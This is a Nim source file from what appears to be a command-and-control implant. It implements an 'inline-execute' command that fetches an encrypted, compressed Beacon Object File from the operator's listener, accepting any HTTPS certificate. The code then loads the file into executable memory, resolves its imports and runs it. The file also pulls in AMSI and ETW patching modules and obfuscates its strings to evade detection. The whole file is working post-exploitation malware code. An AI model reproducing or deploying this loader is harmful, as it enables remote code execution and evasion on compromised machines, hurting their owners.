import ../../util/crypto
import ../../util/risky/[beaconFunctions, structs]
import ptr_math except `-`
import std/strutils
import system
import winim/lean
from zippy import uncompress
import ../../selfProtections/patches/patchAMSI
import ../../selfProtections/patches/patchETW
import ../../util/strenc
import ../../core/webClientListener
import std/streams
import std/os
import unicode

# Largely based on the excellent NiCOFF project by @frkngksl
# Source: https://github.com/frkngksl/NiCOFF/blob/main/Main.nim
type COFFEntry = proc(args:ptr byte, argssize: uint32) {.stdcall.}

proc HexStringToByteArray(hexString:string,hexLength:int):seq[byte] =
    var returnValue:seq[byte] = @[]
    for i in countup(0,hexLength-1,2):
        try:
            #cho hexString[i..i+1]
            returnValue.add(fromHex[uint8](hexString[i..i+1]))
        except ValueError:
            return @[]
    #fromHex[uint8]
    return returnValue

# By traversing the relocations of text section, we can count the external functions
proc GetNumberOfExternalFunctions(fileBuffer:seq[byte],textSectionHeader:ptr SectionHeader):uint64 =
    var returnValue:uint64=0
    var symbolTableCursor:ptr SymbolTableEntry = nil
    var symbolTable:ptr SymbolTableEntry = cast[ptr SymbolTableEntry](unsafeAddr(fileBuffer[0]) + cast[int]((cast[ptr FileHeader](unsafeAddr(fileBuffer[0]))).PointerToSymbolTable))
    var relocationTableCursor:ptr RelocationTableEntry = cast[ptr RelocationTableEntry](unsafeAddr(fileBuffer[0]) + cast[int](textSectionHeader.PointerToRelocations))
    for i in countup(0,cast[int](textSectionHeader.NumberOfRelocations-1)):
        symbolTableCursor = cast[ptr SymbolTableEntry](symbolTable + cast[int](relocationTableCursor.SymbolTableIndex))
        # Condition for an external symbol
        if(symbolTableCursor.StorageClass == IMAGE_SYM_CLASS_EXTERNAL and symbolTableCursor.SectionNumber == 0):
            returnValue+=1
        relocationTableCursor+=1
    return returnValue

proc GetExternalFunctionAddress(symbolName:string):uint64 =
    var prefixSymbol:string = obf("__imp_")
    var prefixBeacon:string = obf("__imp_Beacon")
    var prefixToWideChar:string = obf("__imp_toWideChar")
    var libraryName:string = ""
    var functionName:string = ""
    var returnAddress:uint64 = 0
    var symbolWithoutPrefix:string = symbolName[6..symbolName.len-1]

    if(not symbolName.startsWith(prefixSymbol)):
        ##result.add(obf("[!] Function with unknown naming convention!"))
        return returnAddress

    # Check is it our cs function implementation
    if(symbolName.startsWith(prefixBeacon) or symbolName.startsWith(prefixToWideChar)):
        for i in countup(0,22):
            if(symbolWithoutPrefix == functionAddresses[i].name):
                return functionAddresses[i].address
    else:
        try:
            # Why removePrefix doesn't work with 2 strings argument?
            var symbolSubstrings:seq[string] = symbolWithoutPrefix.split({'@','$'},2)
            libraryName = symbolSubstrings[0]
            functionName = symbolSubstrings[1]
        except:
            #result.add(obf("[!] Symbol splitting problem!"))
            return returnAddress

        var libraryHandle:HMODULE = LoadLibraryA(addr(libraryName[0]))

        if(libraryHandle != 0):
            returnAddress = cast[uint64](GetProcAddress(libraryHandle,addr(functionName[0])))
            #if(returnAddress == 0):
                #result.add(obf("[!] Error on function address!"))
            return returnAddress
        else:
            #result.add(obf("[!] Error loading library!"))
            return returnAddress
        

proc Read32Le(p:ptr uint8):uint32 = 
    var val1:uint32 = cast[uint32](p[0])
    var val2:uint32 = cast[uint32](p[1])
    var val3:uint32 = cast[uint32](p[2])
    var val4:uint32 = cast[uint32](p[3])
    return (val1 shl 0) or (val2 shl 8) or (val3 shl 16) or (val4 shl 24)

proc Write32Le(dst:ptr uint8,x:uint32):void =
    dst[0] = cast[uint8](x shr 0)
    dst[1] = cast[uint8](x shr 8)
    dst[2] = cast[uint8](x shr 16)
    dst[3] = cast[uint8](x shr 24)

proc Add32(p:ptr uint8, v:uint32) = 
    Write32le(p,Read32le(p)+v)
    
proc ApplyGeneralRelocations(patchAddress:uint64,sectionStartAddress:uint64,givenType:uint16,symbolOffset:uint32):void =
    var pAddr8:ptr uint8 = cast[ptr uint8](patchAddress)
    var pAddr64:ptr uint64 = cast[ptr uint64](patchAddress)

    case givenType:
        of IMAGE_REL_AMD64_REL32:
            Add32(pAddr8, cast[uint32](sectionStartAddress + cast[uint64](symbolOffset) -  patchAddress - 4))
            return
        of IMAGE_REL_AMD64_ADDR32NB:
            Add32(pAddr8, cast[uint32](sectionStartAddress - patchAddress - 4))
            return
        of IMAGE_REL_AMD64_ADDR64:
            pAddr64[] = pAddr64[] + sectionStartAddress
            return
        else:
            #result.add(obf("[!] No code for type"))
            return

var allocatedMemory:LPVOID = nil

proc RunCOFF(functionName:string,fileBuffer:seq[byte],argumentBuffer:seq[byte],mainResult:var string):bool = 
    var fileHeader:ptr FileHeader = cast[ptr FileHeader](unsafeAddr(fileBuffer[0]))
    var totalSize:uint64 = 0
    # Some COFF files may have Optional Header to just increase the size according to MSDN
    var sectionHeaderArray:ptr SectionHeader = cast[ptr SectionHeader] (unsafeAddr(fileBuffer[0])+cast[int](fileHeader.SizeOfOptionalHeader)+sizeof(FileHeader))
    var sectionHeaderCursor:ptr SectionHeader = sectionHeaderArray
    var textSectionHeader:ptr SectionHeader = nil
    var sectionInfoList: seq[SectionInfo] = @[]
    var tempSectionInfo:SectionInfo
    var memoryCursor:uint64 = 0
    var symbolTable:ptr SymbolTableEntry = cast[ptr SymbolTableEntry](unsafeAddr(fileBuffer[0]) + cast[int](fileHeader.PointerToSymbolTable))
    var symbolTableCursor:ptr SymbolTableEntry = nil
    var relocationTableCursor:ptr RelocationTableEntry = nil
    var sectionIndex:int = 0
    var isExternal:bool = false
    var isInternal:bool = false
    var patchAddress:uint64 = 0
    var stringTableOffset:int = 0
    var symbolName:string = ""
    var externalFunctionCount:int = 0
    var externalFunctionStoreAddress:ptr uint64 = nil
    var tempFunctionAddr:uint64 = 0
    var delta:uint64 = 0
    var tempPointer:ptr uint32 = nil
    var entryAddress:uint64 = 0
    var sectionStartAddress:uint64 = 0

    # Calculate the total size for allocation
    for i in countup(0,cast[int](fileHeader.NumberOfSections-1)):
        if($(addr(sectionHeaderCursor.Name[0])) == ".text"):
            # Seperate saving for text section header
            textSectionHeader = sectionHeaderCursor

        # Save the section info
        tempSectionInfo.Name = $(addr(sectionHeaderCursor.Name[0]))
        tempSectionInfo.SectionOffset = totalSize
        tempSectionInfo.SectionHeaderPtr = sectionHeaderCursor
        sectionInfoList.add(tempSectionInfo)

        # Add the size
        totalSize+=sectionHeaderCursor.SizeOfRawData
        sectionHeaderCursor+=1

    if(textSectionHeader.isNil()):
        mainResult.add(obf("[!] Text section not found!\n"))
        return false

    # We need to store external function addresses too
    allocatedMemory = VirtualAlloc(NULL, cast[UINT32](totalSize+GetNumberOfExternalFunctions(fileBuffer,textSectionHeader)), MEM_COMMIT or MEM_RESERVE or MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE)
    if(allocatedMemory == NULL):
        mainResult.add(obf("[!] Failed memory allocation!\n"))
        return false

    # Now copy the sections
    sectionHeaderCursor = sectionHeaderArray
    externalFunctionStoreAddress = cast[ptr uint64](totalSize+cast[uint64](allocatedMemory))
    for i in countup(0,cast[int](fileHeader.NumberOfSections-1)):
        copyMem(cast[LPVOID](cast[uint64](allocatedMemory)+memoryCursor),unsafeaddr(fileBuffer[0])+cast[int](sectionHeaderCursor.PointerToRawData),sectionHeaderCursor.SizeOfRawData)
        memoryCursor += sectionHeaderCursor.SizeOfRawData
        sectionHeaderCursor+=1

    when defined verbose:
        mainResult.add(obf("[+] Sections copied.\n"))

    # Start relocations
    for i in countup(0,cast[int](fileHeader.NumberOfSections-1)):
        # Traverse each section for its relocations
        when defined verbose:
            mainResult.add(obf("  [+] Performing relocations for section '") & $sectionInfoList[i].Name & "'.\n")
        relocationTableCursor = cast[ptr RelocationTableEntry](unsafeAddr(fileBuffer[0]) + cast[int](sectionInfoList[i].SectionHeaderPtr.PointerToRelocations))
        for relocationCount in countup(0, cast[int](sectionInfoList[i].SectionHeaderPtr.NumberOfRelocations)-1):
            symbolTableCursor = cast[ptr SymbolTableEntry](symbolTable + cast[int](relocationTableCursor.SymbolTableIndex))
            sectionIndex = cast[int](symbolTableCursor.SectionNumber - 1)
            isExternal = (symbolTableCursor.StorageClass == IMAGE_SYM_CLASS_EXTERNAL and symbolTableCursor.SectionNumber == 0)
            isInternal = (symbolTableCursor.StorageClass == IMAGE_SYM_CLASS_EXTERNAL and symbolTableCursor.SectionNumber != 0)
            patchAddress = cast[uint64](allocatedMemory) + sectionInfoList[i].SectionOffset + cast[uint64](relocationTableCursor.VirtualAddress - sectionInfoList[i].SectionHeaderPtr.VirtualAddress)
            if(isExternal):
                # If it is a function
                stringTableOffset = cast[int](symbolTableCursor.First.value[1])
                symbolName = $(cast[ptr byte](symbolTable+cast[int](fileHeader.NumberOfSymbols))+stringTableOffset)
                tempFunctionAddr = GetExternalFunctionAddress(symbolName)
                if(tempFunctionAddr != 0):
                    (externalFunctionStoreAddress + externalFunctionCount)[] = tempFunctionAddr
                    delta = cast[uint64]((externalFunctionStoreAddress + externalFunctionCount)) - cast[uint64](patchAddress) - 4
                    tempPointer = cast[ptr uint32](patchAddress)
                    tempPointer[] = cast[uint32](delta)
                    externalFunctionCount+=1
                else:
                    mainResult.add(obf("[!] Unknown symbol resolution!\n"))
                    return false
            else:
                if(sectionIndex >= sectionInfoList.len or sectionIndex < 0):
                    mainResult.add(obf("[!] Error on symbol section index!\n"))
                    return false
                sectionStartAddress = cast[uint64](allocatedMemory) + sectionInfoList[sectionIndex].SectionOffset
                if(isInternal):
                    for internalCount in countup(0,sectionInfoList.len-1):
                        if(sectionInfoList[internalCount].Name == obf(".text")):
                            sectionStartAddress = cast[uint64](allocatedMemory) + sectionInfoList[internalCount].SectionOffset
                            break
                ApplyGeneralRelocations(patchAddress,sectionStartAddress,relocationTableCursor.Type,symbolTableCursor.Value)
            relocationTableCursor+=1

    when defined verbose:
        mainResult.add(obf("[+] Relocations completed!\n"))

    for i in countup(0,cast[int](fileHeader.NumberOfSymbols-1)):
        symbolTableCursor = symbolTable + i
        if(functionName == $(addr(symbolTableCursor.First.Name[0]))):
            when defined verbose:
                mainResult.add(obf("[+] Trying to find entrypoint: '") & $functionName & "'...\n" )

            entryAddress = cast[uint64](allocatedMemory) + sectionInfoList[symbolTableCursor.SectionNumber-1].SectionOffset + symbolTableCursor.Value

    if(entryAddress == 0):
        mainResult.add(obf("[!] Entrypoint not found.\n"))
        return false
    var entryPtr:COFFEntry = cast[COFFEntry](entryAddress)

    when defined verbose:
        mainResult.add(obf("[+] Entrypoint found! Executing...\n"))

    if(argumentBuffer.len == 0):
        entryPtr(NULL,0)
    else:
        entryPtr(unsafeaddr(argumentBuffer[0]),cast[uint32](argumentBuffer.len))
    return true

# Function to package arguments with DEBUG
proc PackArguments(args: varargs[string]): seq[byte] =
  # We'll use a MemStream that works with bytes
  var stream = newStringStream()
  var currentArgIndex = 2 # Arguments start at args[2]
  
  while currentArgIndex < args.len:
    let valueStr = args[currentArgIndex]
    if currentArgIndex + 1 >= args.len:
      return @[] # Missing type, return empty

    let typeChar = args[currentArgIndex + 1]
    
    case typeChar:
    of "z": # String (null-terminated)
      stream.write(valueStr)
      stream.write(byte(0)) # Null terminator
    of "Z": # Wide String (UTF-16 LE, null-terminated)
      for c in valueStr:
        stream.write(byte(ord(c) and 0xFF))
        stream.write(byte((ord(c) shr 8) and 0xFF))
      stream.write(byte(0))
      stream.write(byte(0))
    of "i": # Integer (32-bit)
      try:
        let intVal = parseInt(valueStr).int32
        stream.write(byte(intVal and 0xFF))
        stream.write(byte((intVal shr 8) and 0xFF))
        stream.write(byte((intVal shr 16) and 0xFF))
        stream.write(byte((intVal shr 24) and 0xFF))
      except ValueError:
        return @[]
    of "s": # Short (16-bit)
      try:
        let shortVal = parseInt(valueStr).int16
        stream.write(byte(shortVal and 0xFF))
        stream.write(byte((shortVal shr 8) and 0xFF))
      except ValueError:
        return @[]
    of "b": # Binary (hex string)
      let binData = HexStringToByteArray(valueStr, valueStr.len)
      if binData.len == 0 and valueStr.len > 0:
         return @[]
      # Write length in little-endian
      let dataLen = binData.len.uint32
      stream.write(byte(dataLen and 0xFF)) 
      stream.write(byte((dataLen shr 8) and 0xFF))
      stream.write(byte((dataLen shr 16) and 0xFF))
      stream.write(byte((dataLen shr 24) and 0xFF))
      # Write binary data
      for b in binData:
        stream.write(b)
    else:
      return @[]

    currentArgIndex += 2 # Move to the next arg/type pair
  
  # Manually convert the resulting string to seq[byte]
  let stringData = stream.data
  var byteData = newSeq[byte](stringData.len)
  if stringData.len > 0:
    copyMem(addr(byteData[0]), unsafeAddr(stringData[0]), stringData.len)
  
  return byteData

# Execute a BOF from an encrypted and compressed stream or from a server file
proc inlineExecute*(li : Listener, args : varargs[string]) : string =
    # Validate arguments
    if (not args.len >= 2):
        result = obf("Invalid number of arguments received. Usage: 'inline-execute [file_id] [entrypoint] <arg1 type1 arg2 type2..>'.")
        return
    
    var 
        fileBuffer: seq[byte]
        nimEntry: string = args[1]

    # Get the file ID/path
    let fileId: string = args[0]
    
    # Build URL with fileId
    var url = toLowerAscii(li.listenerType) & obf("://")
    if li.listenerHost != "":
        url = url & li.listenerHost
    else:
        url = url & li.implantCallbackIp & obf(":") & li.listenerPort
    url = url & li.taskpath & obf("/") & fileId
    
    # Get the file using the same approach as upload.nim
    let req = Request(
        url: parseUrl(url),
        headers: @[
                Header(key: obf("User-Agent"), value: li.userAgent),
                Header(key: obf("X-Request-ID"), value: li.id),
                Header(key: obf("X-Correlation-ID"), value: li.httpAllowCommunicationKey),
                Header(key: obf("Content-MD5"), value: "inline-execute")
            ],
        allowAnyHttpsCertificate: true,
    )
    let res: Response = fetch(req)

    # Check the result
    if res.code != 200:
        return obf("Error fetching BOF file: Server returned code ") & $res.code
    
    # Process file content
    try:
        # 1. Decrypt to string (assuming it returns string with raw bytes)
        var decStr: string = decryptData(res.body, li.UNIQUE_XOR_KEY)
        if decStr.len == 0:
            return obf("Error: Decryption resulted in empty data (string)")

        # 2. Convert to bytes
        var decryptedBytes: seq[byte] = newSeq[byte](decStr.len)
        if decStr.len > 0:
            copyMem(addr(decryptedBytes[0]), unsafeAddr(decStr[0]), decStr.len)

        # 3. Decompress bytes
        var decompressedBytes: seq[byte] = uncompress(decryptedBytes)
        if decompressedBytes.len == 0:
            return obf("Error: Decompression resulted in empty data")

        fileBuffer = decompressedBytes # Assign the decompressed bytes

    except Exception as e:
        return obf("Error processing file data: ") & getCurrentExceptionMsg()

    # --- ARGUMENTS SECTION ---
    var argumentBuffer: seq[byte] = @[]

    if args.len > 2:
        # Preprocess args to remove quotes and filter empty arguments
        var processedArgs = newSeq[string]()
        
        # First add the two required arguments
        processedArgs.add(args[0])
        processedArgs.add(args[1])
        
        # Then process extra arguments only if they're not empty
        var i = 2
        while i < args.len:
            var arg = args[i]
            
            # Remove quotes from beginning and end if they exist
            if arg.len >= 2 and arg[0] == '"' and arg[^1] == '"':
                arg = arg[1..^2]  # Remove first and last quote
                
            # Only process non-empty arguments
            if arg.len > 0:
                # If it's an argument, we need its type
                if i + 1 < args.len:
                    var typeArg = args[i+1]
                    # Clean quotes from the type too
                    if typeArg.len >= 2 and typeArg[0] == '"' and typeArg[^1] == '"':
                        typeArg = typeArg[1..^2]
                    
                    # Add the value-type pair
                    processedArgs.add(arg)
                    processedArgs.add(typeArg)
                    i += 2  # Advance to the next pair
                else:
                    # If no type available, error
                    result = obf("[!] Error: missing type for arguments")
                    return
            else:
                # If the argument is empty, skip it
                i += 1  # Only advance one to maintain parity
        
        # Verify if there are complete arg/type pairs after file_id and entry_point
        if processedArgs.len > 2:
            if ((processedArgs.len - 2) mod 2) != 0:
                result = obf("[!] Error: missing type for arguments")
                return
            
            # Use the processed arguments
            argumentBuffer = PackArguments(processedArgs)
    # --- END ARGUMENTS SECTION ---

    # Run COFF file
    var coffResult: string = ""
    if (not RunCOFF(nimEntry, fileBuffer, argumentBuffer, coffResult)):
        result.add(coffResult)
        result.add(obf("[!] BOF file not executed due to errors.\n"))
        if allocatedMemory != nil:
            VirtualFree(allocatedMemory, 0, MEM_RELEASE)
        return

    result.add(obf("[+] BOF file executed.\n"))

    var outData:ptr char = BeaconGetOutputData(NULL);
    if(outData != NULL):
        result.add(obf("[+] Output:\n"))
        result.add($outData)

    # Free memory if allocated
    if allocatedMemory != nil:
        VirtualFree(allocatedMemory, 0, MEM_RELEASE)
    return